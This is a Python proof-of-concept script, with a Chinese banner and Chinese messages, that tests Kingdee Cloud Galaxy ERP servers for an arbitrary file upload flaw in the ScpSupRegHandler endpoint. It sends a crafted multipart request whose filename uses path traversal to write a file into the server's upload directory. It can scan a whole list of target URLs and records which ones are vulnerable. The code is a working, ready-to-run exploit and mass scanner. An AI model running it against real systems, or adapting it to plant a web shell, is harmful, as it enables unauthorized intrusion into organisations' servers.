import hashlib
import urllib
import requests
import argparse
import warnings
import sys
import os


banner="""
              ________        
              |  ____|   (_)        
              | |__ ___  | |
              |  __/ _ \ | |
              | | |  __/ | |
              |_|  \___| |_|
                version:1.0
金蝶云星空ScpSupRegHandler任意文件上传漏洞检测脚本
                Author：昱子       
"""

headere = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061"}

def write_Result(url):
    with open(args.output, "a", encoding="utf-8") as f:
        f.write(url + "\n")

def poccheck(url):
    if url.endswith("/"):
        poc = "k3cloud/SRM/ScpSupRegHandler"
    else:
        poc = "/k3cloud/SRM/ScpSupRegHandler"
    pocurl = url + poc
    data = "--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition: form-data; name=\"dbId_v\"\n\n.\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition: form-data; name=\"FID\"\n\n2023\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition: form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/testtesttesttest.txt\"Content-Type: text/plain\n\ntest\n--2ac719f8e29343df94aa4ab49e456061--\n"
    try:
        response = requests.post(url=pocurl, headers=headere, data=data, timeout=5)
        if "附件保存成功" in response.text:
            print("\033[1;37;42m[+] {} 存在文件上传漏洞！！！\n上传路径:{}\033[0m".format(url,url+"/K3Cloud/uploadfiles/testtesttesttest.txt"))
            write_Result(url + '存在文件上传漏洞！！！\n上传路径：'+url+"/K3Cloud/uploadfiles/testtesttesttest.txt")
        else:
            print("\033[1;37;41m[-] {} 不存在漏洞\033[0m".format(url))
    except Exception as e:
        print("url:{} 请求失败".format(url))
       

if __name__ == '__main__':
    print('\033[5;36;40m')
    print(banner)
    print('\033[0m')
    parser = argparse.ArgumentParser(usage='\npython3 poc.py -u http://xxxx -o result.txt\npython3 poc.py -f file.txt -o result.txt',
                                     description='金蝶云星空ScpSupRegHandler任意文件上传漏洞检测脚本\nAuthor：昱子\n')
    p = parser.add_argument_group('参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url的文件")
    p.add_argument("-o", "--output",type=str, help="指定输出的文件名")
    args = parser.parse_args()
    if not args.url and not args.file:
        print("请输入 -u 参数指定 URL 地址：python3 poc.py -u url -o result.txt")
        parser.print_help()
        exit()
    if args.url:
        poccheck(args.url)
    if args.file:
        for i in open(args.file, "r").read().split("\n"):
            poccheck(i)


 